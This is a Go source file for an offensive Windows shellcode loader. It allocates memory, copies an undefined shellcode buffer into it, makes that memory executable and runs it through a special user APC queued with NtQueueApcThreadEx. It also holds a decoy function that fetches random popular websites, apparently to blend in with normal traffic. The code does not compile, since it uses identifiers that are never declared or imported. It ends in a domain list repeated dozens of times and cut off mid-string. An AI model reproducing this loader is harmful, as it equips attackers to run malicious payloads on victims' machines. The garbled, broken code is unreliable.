package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"sync"
	"time"

	"golang.org/x/sys/windows"
)

const (
	MEM_COMMIT   = 0x1000
	MEM_RESERVE  = 0x2000
	PAGE_EXECUTE = 0x20
	PAGE_READWRITE = 0x04
)

const (
	QUEUE_USER_APC_FLAGS_NONE = iota
	QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
	QUEUE_USER_APC_FLAGS_MAX_VALUE
)

func main() {
	verbose := flag.Bool("verbose", false, "Enable verbose output")
	debug := flag.Bool("debug", false, "Enable debug output")
	flag.Parse()

	if *debug {
		fmt.Println("[DEBUG]Loading kernel32.dll and ntdll.dll...")
	}
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	if *debug {
		fmt.Println("[DEBUG]Loading VirtualAlloc, VirtualProtect, and RtlCopyMemory procedures...")
	}
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	GetCurrentThread := kernel32.NewProc("GetCurrentThread")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	NtQueueApcThreadEx := ntdll.NewProc("NtQueueApcThreadEx")

	if *debug {
		fmt.Println("[DEBUG]Calling VirtualAlloc for shellcode...")
	}
	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	if addr == 0 {
		log.Fatal("[!]VirtualAlloc failed and returned 0")
	}

	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Allocated %d bytes", len(shellcode)))
	}

	if *debug {
		fmt.Println("[DEBUG]Copying shellcode to memory with RtlCopyMemory...")
	}
	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", errRtlCopyMemory.Error()))
	}
	if *verbose {
		fmt.Println("[-]Shellcode copied to memory")
	}

	if *debug {
		fmt.Println("[DEBUG]Calling VirtualProtect to change memory region to PAGE_EXECUTE_READ...")
	}

	oldProtect := PAGE_READWRITE
	_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error()))
	}
	if *verbose {
		fmt.Println("[-]Shellcode memory region changed to PAGE_EXECUTE_READ")
	}

	if *debug {
		fmt.Println("[DEBUG]Calling GetCurrentThread...")
	}
	thread, _, err := GetCurrentThread.Call()
	if err.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling GetCurrentThread:\n%s", err))
	}
	if *verbose {
		fmt.Printf("[-]Got handle to current thread: %v\n", thread)
	}

	if *debug {
		fmt.Println("[DEBUG]Calling NtQueueApcThreadEx...")
	}
	_, _, err = NtQueueApcThreadEx.Call(thread, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC, uintptr(addr), 0, 0, 0)
	if err.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling NtQueueApcThreadEx:\n%s", err))
	}
	if *verbose {
		fmt.Println("[-]Queued special user APC")
	}

	if *verbose {
		fmt.Println("[+]Shellcode Executed")
	}
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

func fetchRandomURLs() {
	numUrls := 3
	urls := make([]string, numUrls)

	for i := 0; i < numUrls; i++ {
		urls[i] = fmt.Sprintf("https://%s.com", getRandomDomain())
	}

	for _, url := range urls {
		go func(url string) {
			resp, err := http.Get(url)
			if err != nil {
				log.Printf("Error fetching %s: %s", url, err)
			} else {
				defer resp.Body.Close()
			}
		}(url)
	}
}

func getRandomDomain() string {
	domains := []string{"google", "facebook", "amazon", "youtube", "twitter", "wikipedia", "qq", "taobao", "baidu", "jd", "alibaba", "sina", "sohu", "netease", "tencent", "wechat", "linkedin", "github", "reddit", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter", "microsoft", "apple", "oracle", "ebay", "paypal", "visa", "disney", "cnn", "bbc", "time", "nature", "nytimes", "axios", "reddit", "linkedin", "github", "stackoverflow", "instagram", "twitter